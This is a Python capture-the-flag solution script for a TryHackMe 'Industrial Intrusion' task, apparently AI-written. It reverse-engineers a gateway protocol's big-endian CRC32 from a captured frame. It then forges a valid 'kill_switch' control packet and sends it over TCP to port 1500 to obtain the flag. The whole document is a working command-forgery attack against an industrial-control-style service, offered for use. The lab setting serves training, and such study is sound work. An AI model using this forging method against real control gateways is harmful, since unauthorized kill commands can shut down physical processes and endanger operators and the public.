#script by ChatGPT for tryhacme room Task 21 CRC Me If You Can Industrial Intrusion https://tryhackme.com/room/industrial-intrusion
# script for loal testing in case you wantn to test in your local machine. for live tryhacme machine chant below HOST
# YouTube video walk through: https://youtu.be/-zylGSCC6cU

import socket
import struct
from gateway_proto import crc32 # Import the provided CRC function

# --- Configuration ---
HOST = '127.0.0.1'
CONTROL_PORT = 1500

# --- Step 1: Verify the structure and the BIG-ENDIAN CRC ---
print("[*] Step 1: Final analysis of frame structure and endianness...")

# The last 4 bytes of the file are the big-endian CRC
with open('open_frame.bin', 'rb') as f:
    open_frame_data = f.read()

command_open_payload = open_frame_data[:-4]
known_crc_bytes = open_frame_data[-4:]

# THE FIX IS HERE: Use '>' for big-endian instead of '<' for little-endian.
(known_crc_int,) = struct.unpack('>I', known_crc_bytes)

# We hypothesize the CRC is on the command part only. Let's isolate it.
# The command is the last 4 bytes of the payload part.
command_open = command_open_payload[-4:]
header = command_open_payload[:-4]

# Calculate the CRC of the command part
calculated_crc_int = crc32(command_open)

print(f"    -> Header: {header.hex()}")
print(f"    -> Command: {command_open.decode()}")
print(f"    -> Known CRC from file (Big-Endian): {hex(known_crc_int)}")
print(f"    -> Calculated CRC of command:        {hex(calculated_crc_int)}")

# This assertion should now pass.
assert calculated_crc_int == known_crc_int
print("[+] Success! The protocol uses a Big-Endian CRC.\n")


# --- Step 2: Construct the "Kill Switch" packet ---
print("[*] Step 2: Constructing the 'kill_switch' packet...")

with open('kill_switch.bin', 'rb') as f:
    command_kill = f.read()

# The header is the same (magic, type, length). Length is still 4.
kill_frame_data = header + command_kill
print(f"    -> Packet data (pre-CRC): {kill_frame_data.hex()}")

# Calculate CRC on the command data.
kill_crc_int = crc32(command_kill)
print(f"    -> Calculated CRC for 'KILL': {hex(kill_crc_int)}")

# THE FIX IS HERE: Pack the CRC integer into bytes using big-endian format.
kill_crc_bytes = struct.pack('>I', kill_crc_int)

# Assemble the final packet.
final_packet = kill_frame_data + kill_crc_bytes

print(f"    -> Final packet to send: {final_packet.hex()}")
print("[+] 'kill_switch' packet constructed successfully.\n")


# --- Step 3: Send the packet and get the flag ---
print(f"[*] Step 3: Sending final packet to {HOST}:{CONTROL_PORT}...")
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, CONTROL_PORT))
        print("    -> Connected.")
        
        s.sendall(final_packet)
        print("    -> Packet sent.")
        
        response = s.recv(1024)
        print("\n[!] === SERVER RESPONSE ===\n")
        print(response.decode(errors='ignore'))
        print("\n[!] =======================\n")

except Exception as e:
    print(f"[-] An error occurred: {e}")
